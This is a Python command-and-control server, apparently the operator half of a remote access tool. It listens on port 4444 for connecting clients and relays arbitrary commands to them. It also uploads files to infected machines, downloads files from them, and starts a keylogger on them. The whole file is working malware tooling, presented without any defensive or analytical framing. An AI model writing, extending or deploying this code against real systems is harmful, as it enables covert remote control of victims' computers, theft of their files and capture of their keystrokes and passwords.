import socket
import threading
import base64

#create socket for client connection(n9drou ndirou multiple clients !)
def handle_client(client_socket):
	while True:
		try:
			
			command = input("C2> Enter a Command: ")
			if command.lower() == 'exit':
				break
			
			if command.startswith('upload '):
				local_path = command.split(' ')[1]
				with open(local_path, 'rb') as f:
					file_data = f.read()
				encoded_data = base64.b64encode(file_data).decode()
				command = f"upload {command.split(' ')[2]}"
				client_socket.send(command.encode())
				client_socket.send(encoded_data.encode())
				output = client_socket.recv(4096).decode()
				print(output)
				continue

			client_socket.send(command.encode())

			output = client_socket.recv(4096).decode()
			if  command.startswith('download '):
				output = base64.b64decode(output.encode())
				filename = command[9:]
				with open(filename, 'wb') as f:
					f.write(output)
				print(f"File {filename} downloaded successfully.")
				continue
			if command == 'keylogger':
				if client_socket.recv(4096).decode() == "Keylogging ...":
					output = "Keylogging ... started on client machine."
					print(output)
			if output == "":
				output = "No output received."
			print(output)
		except Exception as e:
			print(f"An error occurred: {e}")
			break
	client_socket.close()




def start_server():
	serverIP = "0.0.0.0"
	serverPort = 4444

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((serverIP, serverPort))
	s.listen(5)
	print(f"[*] Listening on {serverIP}:{serverPort}")

	while True:
		conn, addr = s.accept()
		print(f"[*] Connection established from {addr[0]}:{addr[1]}")
		print("[*] Waiting for next connection...")
		print("--------------------------------------------------")
		print("C2 Server is Running...")
		print("enter any command to send to the client")
		print("type 'keylogger' to start keylogger on client machine (type 'exit' to stop it)")
		print("type 'upload <path on server> <path on client>' to upload file to client machine")
		print("type 'download <path>' to download file from client machine")
		print("type 'exit' to terminate the connection")
		client_handler = threading.Thread(target=handle_client, args=(conn,))
		client_handler.start()


if __name__ == "__main__":
	start_server()